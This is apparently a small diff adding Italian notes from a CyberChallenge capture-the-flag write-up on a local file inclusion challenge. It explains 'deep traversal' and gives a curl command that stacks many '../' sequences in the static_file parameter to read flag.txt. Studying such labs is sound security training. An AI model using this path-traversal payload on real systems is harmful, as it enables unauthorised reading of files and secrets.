@@ -1,0 +1,5 @@
+Deep Traversal (Aumenta la profondità)
+    Forse 4 livelli non bastano. Su alcuni sistemi la struttura delle cartelle è molto profonda.
+    Prova a esagerare (Linux ignora i ../ extra una volta arrivati alla root):
+
+    curl -s "http://basiclfi.challs.cyberchallenge.it/static.php?static_file=../../../../../../../../../../flag.txt"
